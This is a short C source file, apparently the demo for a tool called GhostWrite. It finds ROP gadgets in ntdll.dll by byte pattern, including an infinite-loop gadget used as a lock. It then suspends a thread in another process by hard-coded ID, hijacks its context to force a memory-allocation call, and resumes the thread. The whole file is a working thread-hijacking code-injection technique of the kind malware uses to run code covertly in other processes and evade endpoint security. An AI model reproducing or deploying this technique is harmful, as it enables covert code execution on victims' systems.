#include "GhostWrite.h"

/*
RtlInitializeGenericTableAvl
48 89 7E 50     mov     [rsi+50h], rdi
48 8B 74 24 40  mov     rsi, [rsp+28h+arg_10]
48 83 C4 20     add     rsp, 20h
5F              pop     rdi
C3              retn

RBX RBP RSI RDI R9 R12 R13 R14 R15
*/

CONTEXT ctPureContext = { 0 };

int main(int argc, char* argv[])
{
	GGIF ggGadgetInfo = { 0 };
	ggGadgetInfo.SrcRegister = RDI;
	ggGadgetInfo.DstRegister = RSI;
	ggGadgetInfo.dwPreStackSize = 0x28;
	ggGadgetInfo.RegisterOffset = 0x50;
	ggGadgetInfo.dwExtStackSize = 0x18;

	ggGadgetInfo.qwGadgetAddress = GwGetGadgetInfo("ntdll.dll", "RtlInitializeGenericTableAvl", 0x58, "48897E*488B7424*4883C4*5FC3");
	ggGadgetInfo.qwAutoLockAddress = GwGetGadgetInfo("ntdll.dll", "RtlIpv6StringToAddressExW", 0x3D2, "EBFE");
	if (!ggGadgetInfo.qwGadgetAddress || !ggGadgetInfo.qwAutoLockAddress)
	{
		printf("[-]: Get Gadget Failure !\r\n");
		return 0;
	}

	HANDLE hThread = NULL;
	DWORD64 qwArg[] = { NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE };
	ctPureContext.ContextFlags = CONTEXT_FULL;
	GwSuspendThread(10168, &hThread, &ctPureContext);

	DWORD64 qwRet = GwWriteReturnAddress(&hThread, &ggGadgetInfo, 4, qwArg, 0x00007FFF8AFC8810);
	printf("%x\r\n", qwRet);

	GwResumeThread(&hThread, &ctPureContext);

	system("pause");
	return 0;
}